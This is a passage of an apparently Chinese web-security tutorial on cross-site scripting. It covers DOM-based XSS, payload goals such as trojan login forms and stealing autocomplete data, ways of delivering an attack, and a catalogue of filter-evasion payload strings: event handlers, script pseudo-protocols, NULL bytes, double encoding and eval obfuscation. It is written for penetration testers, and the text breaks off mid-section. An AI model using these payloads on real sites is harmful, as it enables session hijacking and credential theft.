title="基于DOM的XSS漏洞"></a>基于DOM的XSS漏洞</h3><p>反射型和保存型XSS漏洞都表现出一种特殊的行为模式，其中应用程序提取用户控制的数据并以危险的方式将这些数据都返回给用户。第三类XSS漏洞并不具有这种特点，在这种漏洞中，攻击者的JavaScript通过以下过程得以执行：</p><ul><li>用户请求一个经过专门设计的URL，它由攻击者提交，且其中包含嵌入式JavaScript。</li><li>服务器的响应中并不以任何形式包含攻击者的脚本。</li><li>当用户的浏览器处理这个响应时，上述脚本得到处理。</li></ul><p>由于JavaScript可以访问浏览器的文本对象模型(DOM),因此它能够决定用于加载当前页面的URL。由应用程序发布的一段脚本可以从URL中提取数据，对这些数据进行处理，然后用它动态更新页面的内容。如果这样，应用程序就可能易于受到基于DOM的XSS攻击。</p><p>在前面的反射型XSS漏洞示例中，其中服务器端应用程序将一个URL参数值复制到一条错误信息中。另一种实现相同功能的办法是由应用程序每次返回相同的静态HTML，并使用客户端JavaScript动态生成消息内容。</p><p>利用基于DOM的XSS漏洞的过程如图所示：<br><img src="c" alt=""></p><h4 id="与反射型、保存型XSS的区别"><a href="#与反射型、保存型XSS的区别" class="headerlink" title="与反射型、保存型XSS的区别"></a>与反射型、保存型XSS的区别</h4><p>与保存型XSS漏洞相比，基于DOM的XSS漏洞与反射型XSS漏洞有更大的相似性。利用他们通常需要攻击者诱使一名用户访问一个包含恶意代码的专门设计的URL，并由服务器响应那个确保恶意代码得以执行的特殊请求。但是，在利用反射型与基于DOM的XSS漏洞的细节方面，还存在一些重要差异。</p><h2 id="进行中的XSS攻击"><a href="#进行中的XSS攻击" class="headerlink" title="进行中的XSS攻击"></a>进行中的XSS攻击</h2><h3 id="XSS攻击有效载荷"><a href="#XSS攻击有效载荷" class="headerlink" title="XSS攻击有效载荷"></a>XSS攻击有效载荷</h3><p>迄今为止，我们已经重点分析了典型的XSS攻击有效载荷，如截获一名受害者的会话令牌，劫持他的会话，进而“作为”受害者应用程序，执行操作并占有该用户的账户。实际上，还有其他大量的攻击有效载荷可通过任何类型的XSS漏洞传送。</p><h4 id="虚拟置换"><a href="#虚拟置换" class="headerlink" title="虚拟置换"></a>虚拟置换</h4><p>这种攻击需要在一个Web应用程序页面注入恶意数据，从而向应用程序用户传送误导性信息。它包括简单向站点中注入HTML标记，或使用脚本(有时保存在外部服务器上)在站点中注入精心设计的导航和内容。这种攻击被称为虚拟置换(virtual defacement)，因为攻击者实际上并没有修改保存在目标Web服务器上的内容，而是利用应用程序处理并显示用户提交的输入方面的缺陷实现置换。</p><h4 id="注入木马功能"><a href="#注入木马功能" class="headerlink" title="注入木马功能"></a>注入木马功能</h4><p>这种攻击造成的后果远比虚拟置换严重，它在易受攻击的应用程序中注入实际允许的功能，旨在欺骗终端用户执行某种有害操作(如输入敏感数据),然后将它们传送给攻击者。<br>在一个明显的攻击中，攻击者注入的功能向用户显示一个木马登录表单，要求他们向攻击者控制的服务器提交他们自己的证书。如果由技巧熟练的攻击者实施，这种攻击还允许用户无缝登录到真正的应用程序中，确保他们不会发觉访问过程中的任何反常情况。然后，攻击者就可以自由使用受害者的证书实现自己的目的。这种类型的有效载荷非常适用于在钓鱼攻击中，向用户传送一个经过专门设计、链接可信应用程序的URL，并要求他们正常登录以访问这个URL。</p><h4 id="诱使用户执行操作"><a href="#诱使用户执行操作" class="headerlink" title="诱使用户执行操作"></a>诱使用户执行操作</h4><ul><li>如果攻击者劫持受害者的会话，那么他就可以“作为”该用户使用应用程序，并代表这名用户执行任何操作。但是，这种方法并不总能达到想要的目的。它要求攻击者监控他们自己的服务器，看其是否收到被攻破的用户的会话令牌。它要求攻击者代表每一名用户执行相关操作。如果要向许多用户实施攻击，这种方法并不可行。而且，他在应用程序的日志中留下相当明显的痕迹，用户在调查过程中利用它可以迅速确定执行未授权操作的计算机。</li><li>如果攻击者想要代表每一位被攻破的用户执行一组特殊的操作，就可以采用另一种劫持会话的方式，即利用攻击有效载荷脚本执行操作。如果攻击者想要执行某个需要管理权限的操作，如修改他控制的一个用户的权限，这种方法特别有用。由于用户众多，要劫持每一名用户的会话并确定其是否为管理员，可能需要付出极大的努力。一种更有效的方法是，诱使每个被攻破的用户尝试升级攻击者的权限。</li></ul><h4 id="利用信任关系"><a href="#利用信任关系" class="headerlink" title="利用信任关系"></a>利用信任关系</h4><p>上文介绍了可能被XSS利用的一种重要的信任关系：浏览器信任由发布cookie的Web站点提交的JavaScript。有时，XSS攻击还可以利用其他一些信任关系。</p><ul><li>如果应用程序采用激活自动完成功能的表单，由应用程序提交的JavaScript就可以截获任何以前输入的、用户浏览器保存在自动完成的缓存中的数据。通过示例化相关表单，等待浏览器自动完成它的内容，然后查询表单字段值，上述JavaScript脚本就能够窃取这些数据并将其传送至攻击者的服务器。这种攻击比注入木马功能更为强大，因为它不需要用户执行任何操作就能截获敏感数据。</li><li>一些Web应用程序推荐或要求用户把其域名添加到浏览器的“可信站点”区域内。这意味着攻击者可以利用任何XSS类型的漏洞在受害用户上执行任意代码。</li><li>Web应用程序通常采用包含强大方法的ActiveX控件(请参阅Web安全(11))。一些应用程序在该控件内核实调用的Web页面确实属于正确的Web站点，力求防止第三方滥用这种控件。通过XSS攻击仍然可以滥用这个控件，因为这时调用的代码可以通过控件实施信任检查。</li></ul><h3 id="XSS攻击的传送机制"><a href="#XSS攻击的传送机制" class="headerlink" title="XSS攻击的传送机制"></a>XSS攻击的传送机制</h3><p>确定一个XSS漏洞并设计出利用它的适当有效载荷后，攻击者需要找出方法向应用程序的其他用户传送攻击。我们在前面已经讨论了几种传送方法，实际上，攻击者还可以使用其他许多传送机制。</p><h4 id="传送反射型和基于DOM的XSS攻击"><a href="#传送反射型和基于DOM的XSS攻击" class="headerlink" title="传送反射型和基于DOM的XSS攻击"></a>传送反射型和基于DOM的XSS攻击</h4><p>除了通过电子邮件向随机用户大量发送专门设计的URL这种明显的钓鱼向量外，攻击者还可以尝试使用以下机制传送反射型或基于DOM的XSS攻击。</p><ul><li>在有针对性的攻击中，攻击者可以向个体目标用户或少数几名用户发送一封伪造的电子邮件。例如，可以向管理员发送一封明显由已知用户送出的电子邮件，抱怨某个特殊的URL造成错误。如果攻击者想要攻破某个特殊用户的会话(而非截取随机用户的会话)，实施针对性攻击往往是最有效的传送机制。有时我们把这类攻击称为“鱼叉式钓鱼”。</li><li>可以在即时消息中向目标主机提供一个URL</li><li>第三方Web站点上的内容与代码可用于生成触发XSS漏洞的请求。各种常见的应用程序允许用户发布数量有限的HTML标记，这些标记将按原样向其他用户显示。如果可以使用GET方法触发的XSS漏洞，攻击者就可以在第三方站点上发布一个指向某恶意URL的IMG标签，任何查看以上第三方内容的用户将在不知情的情况下请求该恶意URL。</li><li>攻击者付费购买许多链接至一个URL的横幅广告中，该URL包含一个针对某易受攻击的应用程序的XSS有效载荷</li><li>许多应用程序提供一种“推荐给朋友”或向站点管理员发送反馈的功能，这种功能通常允许用户生成一封电子邮件，其内容与收件人均可自由设置。攻击者能够利用这种功能，通过一封实际源于自己服务器的电子邮件传送XSS攻击。</li></ul><h4 id="传送保存型XSS攻击"><a href="#传送保存型XSS攻击" class="headerlink" title="传送保存型XSS攻击"></a>传送保存型XSS攻击</h4><p>保存型XSS攻击共有两种传送机制：带内和带外传送机制<br>带内传送机制适用于绝大多数情况，这时漏洞数据通过主Web界面提交给应用程序。用户控制的数据最终显示给其他用户的常见位置包括以下几种：</p><ul><li>个人信息</li><li>文档、上传文档及其他数据的名称</li><li>提交给应用程序管理员的反馈或问题</li><li>向其他应用程序或用户传送的消息、注释、问题等</li><li>记录在应用程序中的，并通过浏览器显示给管理员的任何内容，如URL、用户名、HTTP Referer、User-Agent等</li><li>在用户之间共享的上传文件内容<br>在这些情况下，只需向应用程序提交XSS有效载荷，然后等待受害者查看恶意代码，就可以传送XSS有效载荷。</li></ul><p>带外传送机制适用于通过其他渠道向应用程序提交漏洞数据的情况。应用程序通过这种渠道接收数据，并最终在主Web页面生成的HTML页面中显示它。前面描述的针对Web邮件应用程序的攻击就是这种传送机制的典型示例。</p><h4 id="链接XSS与其他攻击"><a href="#链接XSS与其他攻击" class="headerlink" title="链接XSS与其他攻击"></a>链接XSS与其他攻击</h4><p>XSS有时可以与其他漏洞链接在一起，造成破坏性后果。</p><h2 id="查找并利用XSS漏洞"><a href="#查找并利用XSS漏洞" class="headerlink" title="查找并利用XSS漏洞"></a>查找并利用XSS漏洞</h2><p>确定XSS漏洞的基本方法是使用下面这个概念验证攻击字符串：</p><pre class=" language-bash"><code class="language-bash">"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>document.cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>这个字符串被提交给每个应用程序页面中的每一个参数；同时，攻击者监控它的响应，看其中是否出现了相同的字符串。如果发现攻击字符串按原样出现在响应中，几乎可以肯定应用程序存在XSS漏洞。如果仅仅只是为了尽可能快确定应用程序中存在的某种XSS漏洞，以向其他应用程序用户实施攻击，那么这个基本方法是最有效的方法，因为它可以实现高度自动化，而且很少生成错误警报。</p><p>如果是对应用程序进行进行复杂的测试，从而确定尽可能多的漏洞，那么在应用基本方法的同时，还要组合更加复杂的技巧。以下几种情况，通过基本的检测方法可能无法确定应用程序中存在的XSS漏洞。</p><ul><li>许多应用程序实施基于黑名单的初步过滤，试图阻止XSS攻击。通常这些过滤会在请求参数中将&lt; script&gt;之类的表达式过滤掉。</li><li>许多应用程序实施的防XSS过滤存在缺陷，可以通过各种方法避开。例如，假设在处理用户输入之前，应用程序删除其中出现的所有&lt; script&gt;标签，这意味着基本方法中使用的攻击字符串将不会在应用程序的响应中返回。但是，可以对&lt; scirpt&gt;进行处理，成功利用XSS漏洞:<pre class=" language-bash"><code class="language-bash"><span class="token string">">&lt;scirpt >"</span><span class="token operator">></span><span class="token operator">&lt;</span>ScRiPt<span class="token operator">></span><span class="token string">"%3e%3ccscipt%3e"</span><span class="token operator">></span>scr<span class="token operator">&lt;</span>scirpt<span class="token operator">></span>ipt<span class="token operator">></span>%00"<span class="token operator">></span><span class="token operator">&lt;</span>scirpt<span class="token operator">></span></code></pre></li></ul><blockquote><p>注：当利用基于DOM的XSS漏洞时，攻击有效载荷并不在服务器的响应中返回，而是保存在浏览器DOM中，并可被客户端JavaScript访问。在这种情况下，提交一个特殊字符串并检查它是否在服务器的响应中出现的基本检测方法将无法成功发现漏洞。</p></blockquote><h3 id="查找并利用反射型XSS漏洞"><a href="#查找并利用反射型XSS漏洞" class="headerlink" title="查找并利用反射型XSS漏洞"></a>查找并利用反射型XSS漏洞</h3><p>要探查XSS漏洞，最可靠的方法是系统性地检查在解析应用程序过程中确定的所有用户的输入进入点，并遵循以下步骤：</p><ul><li>在每个进入点提交一个良性字符串</li><li>确定此字符串“反射”在应用程序响应中的所有位置</li><li>对于每个反射，确定显示反射型数据时的语法上下文</li><li>提交针对反射的语法上下文而修改的数据，尝试在响应中引入任意脚本</li><li>如果反射型数据被阻止或净化，导致脚本无法执行，则尝试了解并避开应用程序的防御性过滤</li></ul><h4 id="确认用户输入的反射"><a href="#确认用户输入的反射" class="headerlink" title="确认用户输入的反射"></a>确认用户输入的反射</h4><p>检测反射型XSS漏洞的最可靠方法的初始步骤与前面的基本方法类似。</p><h4 id="测试引入脚本的反射"><a href="#测试引入脚本的反射" class="headerlink" title="测试引入脚本的反射"></a>测试引入脚本的反射</h4><p>渗透测试员必须手动检查已确定的每一个反射型输入实例，以核实其是否确实可被利用，在响应中包含反射型数据的每个位置，都需要确认该数据的语法特点。这时，渗透测试员必须找到某种修改输入的方法，以便在将输入复制到应用程序响应中的相同位置时，任何脚本都能够得以执行。</p><blockquote><p>注：测试员必须对请求中出现的任何特殊字符进行URL编码，包括&amp;=+；和空格</p></blockquote><h4 id="检查防御性过滤"><a href="#检查防御性过滤" class="headerlink" title="检查防御性过滤"></a>检查防御性过滤</h4><p>通常情况下，最初提交的攻击字符串并不被服务器按原样返回，因而无法成功执行注入的JavaScript。如果是这样接下来应该确定服务器对输入进行了哪些处理。主要有以下3种可能：</p><ol><li>应用程序或Web应用程序防火墙保护的应用程序发现了一个攻击签名，完全阻止了输入。</li><li>应用程序已经接受了输入，但对攻击字符串进行了某种编码或净化。</li><li>应用程序把攻击字符串截短至某个固定的最大长度。</li></ol><h4 id="避开基于签名的过滤"><a href="#避开基于签名的过滤" class="headerlink" title="避开基于签名的过滤"></a>避开基于签名的过滤</h4><p>在第一种类型的过滤中，应用程序通常会对攻击字符串做出与无害字符串截然不同的响应。如果发生了这种情况，那么接下来，应该确定输入的字符或表达式触发了过滤。一种有效的方法是轮流删除字符串的不同部分，看输入是否仍然被阻止。</p><p>有各种方法可以在HTML页面中引入脚本代码，这些方法通常能够避开基于签名的过滤。因此，测试员要么找到引入脚本的其他方法，要么使用浏览器接受的略显畸形的语法。下面，将介绍各种执行脚本的不同方法，然后说明一系列可用于避开常用过滤的技巧</p><h5 id="引入脚本代码的方法"><a href="#引入脚本代码的方法" class="headerlink" title="引入脚本代码的方法"></a>引入脚本代码的方法</h5><p>有4种不同的方法可用于在HTML页面中引入脚本代码。</p><h5 id="脚本标签"><a href="#脚本标签" class="headerlink" title="脚本标签"></a>脚本标签</h5><p>除直接使用&lt; script&gt;标签外，还可以通过各种方法、使用复杂的语法来隐藏标签，从而避开某些过滤：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>object data<span class="token operator">=</span><span class="token string">"data:text/html,&lt;script>alert(1)&lt;/script>"</span><span class="token operator">></span><span class="token operator">&lt;</span>object data<span class="token operator">=</span><span class="token string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span><span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span><span class="token operator">></span></code></pre><p>上例中基于Base64的字符串为：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><ol><li><p>事件处理器<br>有大量的事件处理器可与各种标签结合使用，以用于执行脚本。HTML5使用事件处理器提供了大量向量。这包括使用autofocus属性自动触发之前需要用户交互的事件：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input autofocus onfocus<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>input onblur<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> autofocus<span class="token operator">></span><span class="token operator">&lt;</span>input autofocus<span class="token operator">></span><span class="token operator">&lt;</span>body onscroll<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>input autofocus<span class="token operator">></span></code></pre><p>它允许在结束标签中使用事件处理器：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>/a onmouseover<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span></code></pre><p>最后，HTML5还通过事件处理器引入了新标签：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>video src<span class="token operator">=</span>1 onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>audio src<span class="token operator">=</span>1 onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span></code></pre></li><li><p>脚本伪协议<br>脚本伪协议可用在各种位置，以便于在需要URL的属性中执行行内脚本。以下是一些示例：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>object data<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>embed src<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span></code></pre><p>虽然上述示例使用的是javascript伪协议，但是，还可以在Internet Explorer上使用vbs协议。<br>和事件处理器一样，HTML5也提供一些在XSS攻击使用脚本伪协议的新方法：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>from id<span class="token operator">=</span>test /<span class="token operator">></span><span class="token operator">&lt;</span>button from<span class="token operator">=</span>test formaction<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>event-source src<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span></code></pre><p>在针对输入过滤进行攻击时，新的event-source标签特别有用。与之前的任何HTML5标签不同，它的名称中包含一个连字符，因此，使用这个标签可以避开传统的、认为只有标签名称只能包含字母的基于正则表达式的过滤</p></li><li><p>动态求值的样式<br>一些浏览器支持在动态求值的CSS样式中使用JavaScript。以下示例在IE7及更早版本上执行，如果在兼容模式下运行，还可以在后续版本上执行：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>x style<span class="token operator">=</span>x:expression<span class="token punctuation">(</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">))</span><span class="token operator">></span></code></pre><p>最新版本的IE不再支持上述语法，因为这些语法只能用在XSS攻击中，但是，在最新版本的IE中，使用以下请求可以达到相同的效果：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>x style<span class="token operator">=</span>behavior:url<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#default#time2) onbegin=alert(1)></span></code></pre><p>使用Firefox浏览器可以使用moz-bingding属性实施基于CSS的攻击，但是，由于应用程序已经这一功能实施了限制，现在无法再通过它来进行XSS攻击。</p></li><li><p>避开过滤：HTML<br>旨在阻止XSS攻击的基于签名的过滤通常采用正则表达式或其他技巧来确定关键的HTML组件，如标签括号、标签名称、属性名称和属性值。通过一种或多种浏览器接受的方式在HTML中的关键位置插入不常见的字符，可以避开其中的许多过滤</p></li><li><p>标签名称<br>从起始标签名称开始，只需改变所使用字符的大小写，即可避开最简单的过滤。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iMg onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">></span></code></pre><p>更进一步，可以在任意位置插入NULL字节:</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token punctuation">[</span>%00<span class="token punctuation">]</span>img onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">></span><span class="token operator">&lt;</span>i<span class="token punctuation">[</span>%00<span class="token punctuation">]</span>mg onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">></span></code></pre><p>[%XX]表示十六进制ASCII代码XX的原义字符。在向应用程序实施攻击时，通常会使用字符的URL编码形式。</p></li></ol><p>有时可以使用任意标签名引入事件处理器，从而避开仅仅阻止特定标签名称的过滤：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>x onclick<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">></span>Click here<span class="token operator">&lt;</span>/x<span class="token operator">></span></code></pre><p>有时，可以引入不同名称的新标签，但却找不到使用这些标签直接执行代码的方法。在这些情况下，可以使用一种被称为”基本标签劫持”的技巧来实施攻击。&lt; base&gt;标签用于指定一个URL，浏览器应使用该URL解析随后在页面中出现的任何相对URL。如果可以引入一个新的&lt; base&gt;,并且页面执行反射点后的任何使用相对URL的&lt; script&gt;，则你就可以指定一个指向受你控制的服务器的基本URL。当浏览器加载在HTML页面的剩余部分指定的脚本时，这些脚本将从指定的服务器加载，但仍然能够在调用它们的页面中执行。</p><ol start="6"><li><p>属性名称<br>可以在属性名称中使用上述NULL字节技巧。这样做可以避免许多试图通过阻止以on开头的属性名称来阻止事件过滤器的简单过滤。</p></li><li><p>属性分隔符<br>属性可以选择使用双引号、单引号或空格进行分隔，或在IE上使用重音符分隔：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img onerror<span class="token operator">=</span><span class="token string">"alert(1)"</span>scr<span class="token operator">=</span>a<span class="token operator">></span><span class="token operator">&lt;</span>img onerror<span class="token operator">=</span><span class="token string">'alert(1)'</span>src<span class="token operator">=</span>a<span class="token operator">></span><span class="token operator">&lt;</span>img onerror<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token variable">`</span></span>src<span class="token operator">=</span>a<span class="token operator">></span></code></pre><p>如果过滤器不知道重音符被用作属性分隔符，它会将下面的示例看作仅包含一个属性，其名称不再为事件处理器的名称：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>a<span class="token variable">`</span></span>onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span></code></pre><p>通过使用引号分隔的属性，并在标签名后插入异常的字符，就可以设计出不需要任何空格的攻击，从而避开一些过滤:</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img/onerror<span class="token operator">=</span><span class="token string">"alert(1)"</span>src<span class="token operator">=</span>a<span class="token operator">></span></code></pre></li><li><p>属性值<br>在属性值中，可以使用NULL字节技巧。还可以使用HTML编码的字符，如下所示:</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img onerror<span class="token operator">=</span>a<span class="token punctuation">[</span>%00<span class="token punctuation">]</span>lert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">></span><span class="token operator">&lt;</span>img onerror<span class="token operator">=</span>a<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#x6c;ert(1) src=a></span></code></pre></li></ol><p>在进一步处理属性值时，浏览器会对其进行HTML编码，因此，可以使用HTML编码对脚本代码进行模糊处理，从而避开任何过滤。<br>在使用HTML编码时，应注意到，浏览器接受规范的各种变体，甚至可能忽略过滤器“意识到”的HTML编码问题。可以使用十进制和十六进制格式，添加多余的前导零，并省略结尾分号。</p><ol start="9"><li>标签括号<br>有时，通过利用奇怪的应用程序或浏览器行为，甚至可以使用无效的标签括号，并且使浏览器按攻击所需的方式处理相关标签。<br>一些应用程序在应用输入后还执行不必要的URL解码，因此，请求中的以下输入：<pre class=" language-bash"><code class="language-bash">%253cimg%20onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span>%20src<span class="token operator">=</span>a%253e</code></pre>被应用程序服务器进行URL解码，然后将以下输入传递给应用程序：<pre class=" language-bash"><code class="language-bash">%3cimg onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a%3e</code></pre>其中不包含任何标签括号，因此不会被输入过滤阻止，但是，应用程序会进行第二次解码。因此输入变成：<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">></span></code></pre>该输入会回显给用户，导致攻击得以实施。</li></ol><p>如果应用程序框架基于字形和发音的相似性，将不常见的Unicode字符”转换”为它们最接近的ASCII字符，这时可能会出现与上述示例类似的情况。如，以下输入使用Unicode双角号(%u00AB和%u00BB),而不是标签括号</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;&lt;</span>img onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> src<span class="token operator">=</span>a<span class="token operator">>></span></code></pre><p>应用程序的输入过滤可能会允许该输入，因为其中不包括任何有问题的HTML。但是，如果应用程序框架在输入被插入到响应中时将引号转换为标签字符，攻击将取得成功。事实证明，大量应用程序都易于受到这些攻击。</p><p>一些输入过滤通过简单地匹配起始和结束尖括号，提取内容，并将其与标签名称黑名单进行比较来识别HTML标签。在这种情况下，可以通过使用多余的括号(如果浏览器接受)来避开过滤</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>//<span class="token operator">&lt;&lt;</span>/scrip</code></pre><ol start="10"><li>字符集<br>可以使用非标准编码表示法致使应用程序接受攻击有效载荷的非标准编码，从而避开各种类型的过滤。如下是一些非标准编码</li></ol><ul><li>UTF-7</li><li>US-ASCII</li><li>UTF-16<br>这些编码后的字符串可避开许多常见的反XSS过滤，实施成功攻击的挑战在于如何使浏览器使用所需的字符集来解释响应。如果你控制了HTTP Content-Type 消息头或其对应的HTML元标签，就可以使非标准字符集避开过滤，使浏览器按照需要的方式解释有效载荷。一些应用程序在某些请求中提交charset参数，允许直接设置在应用程序的响应中使用的字符集。</li></ul><h5 id="避开过滤：脚本代码"><a href="#避开过滤：脚本代码" class="headerlink" title="避开过滤：脚本代码"></a>避开过滤：脚本代码</h5><p>和使用HTML对攻击进行模糊处理一样，也可以通过各种技巧来修改所需的脚本代码，以避开常见的输入过滤。</p><ol><li><p>使用JavaScript转义<br>JavaScript允许各种字符转义，可以通过这种方式避免包含原义格式的表达式。<br>Unicode转义可用于表示JavaScript关键字中的字符，从而避开许多类型的过滤。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>a\u006cert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>如果能够使用eval命令，就可以将其他命令以字符串形式传送给eval命令，从而执行这些命令。在JavaScript中，可以使用Unicode转义、十六进制转义和八进制转义：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span><span class="token string">'a\x6cert(1)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span><span class="token string">'a\154ert(1)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>此外，字符串中的多余转义字符被忽略：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span><span class="token string">'a\1\ert\(1\)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre></li><li><p>动态构建字符串</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span><span class="token string">'al'</span>+<span class="token string">'ert(1)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span>String.fromCharCode<span class="token punctuation">(</span>97,108,101,114,116,40,49,41<span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span>atob<span class="token punctuation">(</span><span class="token string">'amF2YXNjcmlwdDphnGVydCgKQ'</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>上面的示例可以在Firefox上执行，可以通过它解码Base64编码的命令，然后将其传递给eval.</p></li><li><p>替代eval方法<br>如果无法直接调用eval命令，可以通过其他方法以字符串格式执行命令。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token string">'alert(1)'</span>.replace<span class="token punctuation">(</span>/.+/,eval<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>function::<span class="token punctuation">[</span><span class="token string">'alert'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre></li><li><p>替代圆点<br>如果圆点被阻止，可以使用下列方法解决：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>document<span class="token punctuation">[</span><span class="token string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>with<span class="token punctuation">(</span>document<span class="token punctuation">)</span>alert<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre></li><li><p>组合多种技巧<br>在HTML标签属性中使用JavaScript(通过事件处理器、脚本伪协议或动态求值的样式)的情况下，可以将这些技巧与HTML编码组合使用。</p></li><li><p>使用VBScript<br>常见的XSS主要通过JavaScript来实施，但是，在Internet 